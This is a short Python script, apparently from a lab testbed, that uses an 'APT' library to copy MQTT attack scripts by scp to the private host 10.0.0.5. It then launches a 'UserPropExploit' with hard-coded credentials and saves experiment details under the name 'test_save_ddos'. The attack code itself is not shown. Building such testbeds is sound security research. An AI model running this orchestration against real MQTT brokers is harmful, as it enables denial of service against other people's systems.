import APT

atk_seq = [(APT.ScpInstStep("10.0.0.5", ["/mqtt_utilities.py", "user_property_attack.py"]), 1),
           (APT.UserPropExploit("10.0.0.5", "client1", "pass1", duration=500), 1)]
exp_dtls = []
Attack = APT.APTAttack(atk_seq, "test_save_ddos", exp_dtls, "/output/exp_details.pkl")
Attack.run()
Attack.save_in()
